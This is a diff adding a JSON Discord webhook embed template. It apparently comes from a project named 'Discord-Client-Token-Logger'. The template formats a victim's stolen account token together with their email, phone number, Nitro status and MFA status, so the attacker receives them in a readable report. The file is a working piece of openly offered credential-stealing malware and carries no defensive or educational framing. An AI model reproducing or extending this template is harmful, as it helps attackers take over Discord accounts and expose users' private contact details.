@@ -1,0 +1,60 @@
+{
+  "embeds": [
+    {
+      "type": "rich",
+      "title": "%username #%id",
+      "description": "",
+      "color": 65535,
+      "fields": [
+        {
+          "name": ":key2:  Token:",
+          "value": "```%token```",
+          "inline": false
+        },
+        {
+          "name": ":envelope:  Email:",
+          "value": "```%email```",
+          "inline": true
+        },
+        {
+          "name": ":telephone_receiver:  Phone:",
+          "value": "```%phone```",
+          "inline": true
+        },
+        {
+          "name": " ",
+          "value": " ",
+          "inline": false
+        },
+        {
+          "name": " ",
+          "value": " ",
+          "inline": false
+        },
+        {
+          "name": " ",
+          "value": " ",
+          "inline": false
+        },
+        {
+          "name": ":gem:  Nitro:",
+          "value": "`%premium_type`",
+          "inline": true
+        },
+        {
+          "name": ":shield:  MFA:",
+          "value": "`%mfa_enabled`",
+          "inline": true
+        }
+      ],
+      "thumbnail": {
+        "url": "https://cdn.discordapp.com/avatars/%id/%avatar.png",
+        "height": 0,
+        "width": 0
+      },
+      "footer": {
+        "text": "github.com/0x5d0/Discord-Client-Token-Logger"
+      }
+    }
+  ]
+}
